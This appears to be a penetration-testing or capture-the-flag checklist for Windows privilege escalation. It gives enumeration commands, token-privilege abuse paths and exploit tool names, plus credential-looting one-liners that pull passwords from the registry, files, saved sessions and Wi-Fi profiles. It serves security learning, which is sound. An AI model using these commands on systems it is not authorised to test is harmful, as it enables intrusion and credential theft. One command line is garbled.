Full checklist on: https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
#### Useful Tools

- Windows-privesc-check (check for simple priv esc vectors only)
- PowerUp
- Watson
- Sharpup
- windows-exploit-suggester
- windowsExploits - github repo with precompiled known kernel exploits
- secwiki - Windows Exploits - Another github with precompiled exploits [https://github.com/SecWiki/windows-kernel-exploits] 
- seatbelt
- powerless
- winpeas
- powerless

---------------
### But First, Situational Awareness

#### User Enumeration

Get current username

```
echo %USERNAME% || whoami
$env:username
```

List user privilege

```
whoami /priv
whoami /groups
```

List all users

```
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

List logon requirements; useable for bruteforcing

```
powershell$env:usernadsc net accounts
````
Get details about a user (i.e. administrator, admin, current user)

```powershell
net user administrator
net user admin
net user %USERNAME%
````

List all local groups

```
net localgroup
Get-LocalGroup | ft Name
```

Get details about a group (i.e. administrators)

```
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

Get Domain Controllers

```
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

#### Network Enumeration

List all network interfaces, IP, and DNS.

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

List current routing table

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

List the ARP table

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

List all current connections

```
netstat -ano
```

List all network shares

```
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

SNMP Configuration

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

#### Antivirus Enumeration

Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`

#### Default Writeable Folders

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```



-----


---
### Abusing Privilege

- [ ] **SeImpersonate** or **SeAssignPrimaryPrivilege** + GodPotato or Print Spoofer
- [ ] User RoguePotato from **NT/Local Service** to **SYSTEM**
- [ ] Dumping creds from sam or lsass (local admin required)
- [ ] If we have write permissions in System32 folder + wertrigger or diaghub
- [ ] **SeBackupPrivilege**, create a copy of SAM and SYSTEM from registry and crack it offline
- [ ] **SeTcbPrivilege**, If you have enabled this token you can use **KERB_S4U_LOGON** to get an impersonation token for any other user without knowing the credentials, add an arbitrary group (admins) to the token, set the integrity level of the token to "medium", and assign this token to the current thread (SetThreadToken).
- [ ] **SeDebugPrivilege**, It allows the holder to debug another process, this includes reading and writing to that process' memory. If you want to get a `NT SYSTEM` shell you could use: https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
- [ ] The **SeManageVolumeExploit** can be use to run the exploit **SeManageVolumeExploit.exe** which will grant anybody write access on the entire C:\ drive. If we can then write on c:\. we can upload a malicious dll in system32 and escalate using the **WerTrigger** method.
- [ ] From **NT/Network Service** to **SYSTEM**: https://github.com/decoder-it/NetworkServiceExploit
- [ ] **HiveNightmare**, > CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user. Check for the vulnerability using `icacls` . `
```
C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
```

### Abusing Misconfigurations

- [ ] Windows Subsystem for Linux (WSL)
- [ ] **$PATH** **Interception**: PATH contains a writeable folder with low privileges. - The writeable folder is _before_ the folder that contains the legitimate binary. Because (in this example) "C:\Program Files\nodejs\" is _before_ "C:\WINDOWS\system32\" on the PATH variable, the next time the user runs "cmd.exe", our evil version in the nodejs folder will run, instead of the legitimate one in the system32 folder.
- [ ] Check if **AlwaysInstallElevated** is enabled
- [ ] Restore A Service Account's Privileges with **FullPowers**. This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only. https://github.com/itm4n/FullPowers

### Port Forwarding Internal Ports
- [ ] Use Chisel to access internal ports/services that may contain other vulnerable apps. 
### Common Exploits?

- [ ] PrinterNightmare
- [ ] https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop---common-vulnerabilities-and-exposure
### Looting
- [ ] Powershell history
- [ ] Cracking Powershell Secure Strings
- [ ] If you are admin, always check the recycle bin!!! you may find interesting files
- [ ] Powershell Transcript
- [ ] Password in Alternate Data Stream:
```
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag

dir /s /r | findstr /e ":$DATA"
```
- [ ] Cleartext password found in the directory system
```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*
```
- [ ] Passwords in logs (apache, temp, php, mysql)
```
Search for a file in the entire directory:
	dir /s/b \myfile.txt
Search for a file in the curreny directory:
	dir /s/b myfile.txt
```
- [ ] Search the registry for key names and passwords
```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
- [ ] Decoding powershell secure string
- [ ] Passwords in unattend.xml
- [ ] creds in .git github repos commits history
- [ ] Cracking keepass databases
- [ ] Wifi passwords: Oneliner method to extract wifi passwords from all the access point.`cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on`
- [ ] Search for passwords stored in services / saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
### Abusing Services
- [ ] Unquoted Service Path
- [ ] Modify binary path
- [ ] Service Binary Hijack
- [ ] Modify scheduled task
- [ ] Modify autorun/startup program
- [ ] DLL hijacking

### Abusing AD rights
- [ ] GPO modification
- [ ] Adding member to a privilege group

### Kernel Exploits
- [ ] Look for kernel exploits using winpeas, watson, etc.
```
- windows-exploit-suggester
- windowsExploits - github repo with precompiled known kernel exploits
- secwiki - Windows Exploits - Another github with precompiled exploits [https://github.com/SecWiki/windows-kernel-exploits] 
```
### Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.

```
# List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

# List shadow copies using diskshadow
diskshadow list shadows all

# Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
### Bring Your Own Vulnerability

Concealed Position : https://github.com/jacob-baines/concealed_position

- ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
- RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
- POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
- SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE

```
cp_server.exe -e ACIDDAMAGE
# Get-Printer
# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE
```
